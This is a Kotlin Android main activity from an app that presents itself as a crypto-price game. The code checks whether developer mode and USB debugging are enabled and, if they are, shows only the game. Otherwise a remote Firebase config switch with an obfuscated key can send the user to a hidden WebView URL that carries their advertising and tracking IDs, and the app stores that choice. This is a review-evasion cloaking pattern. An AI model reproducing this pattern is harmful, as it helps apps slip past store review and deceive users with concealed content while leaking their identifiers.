package com.zet.vest.app

import android.content.Context
import android.content.Intent
import android.content.pm.ActivityInfo
import android.os.Build
import android.os.Bundle
import android.provider.Settings
import androidx.annotation.IdRes
import androidx.annotation.RequiresApi
import androidx.appcompat.app.AppCompatActivity
import androidx.core.content.ContextCompat
import androidx.navigation.NavController
import androidx.navigation.findNavController
import com.appsflyer.AppsFlyerLib
import com.google.android.gms.ads.identifier.AdvertisingIdClient
import com.google.firebase.ktx.Firebase
import com.google.firebase.remoteconfig.ktx.remoteConfig
import com.google.firebase.remoteconfig.ktx.remoteConfigSettings
import com.zet.vest.app.databinding.ActivityMainBinding
import com.zet.vest.app.game.util.CryptoUtil
import com.zet.vest.app.util.*
import com.zet.vest.app.util.manager.DataStoreManager
import com.zet.vest.app.util.network.NetworkUtil
import com.zet.vest.app.util.network.internetConnection
import com.zet.vest.app.webView.webViewFragment
import kotlinx.coroutines.*
import kotlinx.coroutines.channels.BufferOverflow
import kotlinx.coroutines.flow.MutableSharedFlow
import org.json.JSONObject
import kotlin.system.exitProcess

class MainActivity : AppCompatActivity() {

    companion object {

        lateinit var binding      : ActivityMainBinding
        lateinit var navController: NavController

        val startFragmentIdFlow = MutableSharedFlow<Int>(replay = 1, onBufferOverflow = BufferOverflow.DROP_OLDEST)
        var webViewURL = "google.com"

        val lottie by lazy { Lottie(binding) }
    }

    private val coroutine = CoroutineScope(Dispatchers.Default)


    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        initialize()

        log("Network = ${internetConnection()}")
        if (internetConnection().not()) lottie.showNotInternet()
        else {
            lottie.showLoader()
            coroutine.launch(Dispatchers.IO) {
                try {
                    checkDataStore()
                } catch (e: Exception) {
                    log("e: ${e.message}")
                    startFragmentIdFlow.emit(R.id.gameFragment)
                }

                launch(Dispatchers.Main) {
                    startFragmentIdFlow.collect { fragmentId ->
                        requestedOrientation = when (fragmentId) {
                            R.id.gameFragment    -> {

//                            binding.root.also { rootCL ->
//                                ConstraintSet().apply {
//                                    clone(rootCL)
//                                    constrainPercentWidth(binding.lottieLoader.id, .2f)
//                                    setHorizontalBias(binding.lottieLoader.id, .9f)
//                                }.applyTo(rootCL)
//                            }
                                launch(Dispatchers.IO) { getCrypto() }
                                ActivityInfo.SCREEN_ORIENTATION_PORTRAIT
                            }
                            R.id.webViewFragment -> {
                                window.navigationBarColor = ContextCompat.getColor(this@MainActivity, R.color.black)
                                ActivityInfo.SCREEN_ORIENTATION_FULL_USER
                            }
                            else                 -> ActivityInfo.SCREEN_ORIENTATION_FULL_USER
                        }
                        setStartDestination(fragmentId)
                    }
                }
            }
        }
    }

    override fun onDestroy() {
        super.onDestroy()
        cancelCoroutinesAll(coroutine)
        finishAndRemoveTask()
        exitProcess(0)
    }

    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
        super.onActivityResult(requestCode, resultCode, data)
        webViewFragment?.onActivityResult(requestCode, resultCode, data)
    }



    private fun initialize() {
        binding = ActivityMainBinding.inflate(layoutInflater)
        setContentView(binding.root)
        navController = findNavController(R.id.nav_host_fragment)
    }

    private fun setStartDestination(
        @IdRes destinationId: Int,
        args: Bundle? = null
    ) {
        with(navController) {
            navInflater.inflate(R.navigation.nav_graph).apply { setStartDestination(destinationId) }.also { setGraph(it, args) }
        }
    }

    // ------------------------------------------------------------------------
    // Logic
    // ------------------------------------------------------------------------

    private suspend fun getCrypto() = CompletableDeferred<Unit>().also { continuation ->
        NetworkUtil.service.getCrypto().also { crypto ->
            log("size crypto - ${crypto.data.size}")
            crypto.data.onEach { data ->
                CryptoUtil.cryptoList.add(CryptoUtil.Crypto().apply {
                    data.id?.let { id = it }
                    data.name?.let { name = it }
                    data.symbol?.let { symbol = it }
                    data.quote?.USD?.price?.let { price = it }
                })
            }
        }

        val ids = CryptoUtil.cryptoList.map { it.id }.toString().replace("[","").replace("]","").replace(" ","")

        NetworkUtil.service.getMetaData(ids).also { metaData ->
            log("size logo - ${metaData.data?.size}")

            CryptoUtil.cryptoList.also { crList ->
                crList.sortBy { cr -> cr.id }

                metaData.data?.onEachIndexed { index, map ->
                    map.value.logo?.let { crList[index].logo = it }
                    if (index == crList.lastIndex) continuation.complete(Unit)
                }
            }
        }
    }

    private fun checkDataStore() {
        coroutine.launch(Dispatchers.IO) {
            when (DataStoreManager.Key.get()) {
                "Good" -> {
                    DataStoreManager.Link.get()?.let {
                        log("DataStoreManager Key = Good | link = $it")
                        webViewURL = it
                        startFragmentIdFlow.emit(R.id.webViewFragment)
                        lottie.hideLoader()
                    }
                }
                "Bad"  -> {
                    log("DataStoreManager Key = Bad")
                    startFragmentIdFlow.emit(R.id.gameFragment)
                }
                else   -> {
                    log("DataStoreManager Key = NONE")
                    if (isDevMode(this@MainActivity) && isUSB(this@MainActivity)) startFragmentIdFlow.emit(R.id.gameFragment)
                    else try {
                        Firebase.remoteConfig.apply {
                            setConfigSettingsAsync(remoteConfigSettings { minimumFetchIntervalInSeconds = 3600 })
                            fetchAndActivate().addOnCompleteListener(this@MainActivity) { task ->
                                if (task.isSuccessful) {
                                    val jsonStr = getString("Farrvatostreet")
                                    log("success = $jsonStr")
                                    JSONObject(jsonStr).also { jsonObj ->
                                        coroutine.launch(Dispatchers.IO) {
                                            getCryptoFromRemote(jsonObj.getBoolean("experiment"), jsonObj.getString("tube"))
                                        }
                                    }

                                } else {
                                    startFragmentIdFlow.tryEmit(R.id.gameFragment)
                                    log("fail = ${this.all}")
                                }
                            }
                        }
                   } catch (e: Exception) {
                       startFragmentIdFlow.emit(R.id.gameFragment)
                   }
                }
            }
        }
    }

    private suspend fun getCryptoFromRemote(experiment: Boolean, tube: String) {
        if (experiment) {
            withContext(Dispatchers.IO) { DataStoreManager.Key.update { "Good" } }
            withContext(Dispatchers.Main) {
                val completer = Completer(coroutine, 2) {
                    val advertisingId = AdvertisingIdClient.getAdvertisingIdInfo(appContext).id
                    val appsflyerUID = AppsFlyerLib.getInstance().getAppsFlyerUID(appContext)

                    val fullTube = tube + "?" +
                            "adurti_did=${advertisingId}&" +
                            "afy_uisd=${appsflyerUID}&" +
                            "com_ing=${AppsflyerUtil.campaignFlow.value}&" +
                            "dooinlk=${FacebookUtil.deeplinkFlow.value}"

                    log("fullTube = $fullTube")

                    webViewURL = fullTube
                    startFragmentIdFlow.tryEmit(R.id.webViewFragment)
                    lottie.hideLoader()

                    coroutine.launch(Dispatchers.IO) { DataStoreManager.Link.update { fullTube } }
                }

                AppsflyerUtil.initialize(this@MainActivity)
                coroutine.launch {
                    AppsflyerUtil.campaignFlow.collect {
                        log("campaignFlow = $it")
                        if (it != AppsflyerUtil.CAMPAIGN_INIT_VALUE) completer.complete()
                    }
                }

                FacebookUtil.initialize()
                coroutine.launch {
                    FacebookUtil.deeplinkFlow.collect {
                        log("deeplinkFlow = $it")
                        if (it != FacebookUtil.DEEPLINK_INIT_VALUE) completer.complete()
                    }
                }
            }
        } else {
            withContext(Dispatchers.IO) { DataStoreManager.Key.update { "Bad" } }
            startFragmentIdFlow.emit(R.id.gameFragment)
        }
    }

    @RequiresApi(Build.VERSION_CODES.JELLY_BEAN)
    fun isDevMode(context: Context): Boolean {
        return when {
            Build.VERSION.SDK_INT > Build.VERSION_CODES.JELLY_BEAN  -> {
                Settings.Secure.getInt(context.contentResolver,
                    Settings.Global.DEVELOPMENT_SETTINGS_ENABLED, 0) != 0
            }
            Build.VERSION.SDK_INT == Build.VERSION_CODES.JELLY_BEAN -> {
                @Suppress("DEPRECATION")
                Settings.Secure.getInt(context.contentResolver,
                    Settings.Secure.DEVELOPMENT_SETTINGS_ENABLED, 0) != 0
            }
            else                                                    -> false
        }
    }

    fun isUSB(context: Context): Boolean = Settings.Secure.getInt(context.contentResolver, Settings.Secure.ADB_ENABLED, 0) != 0

}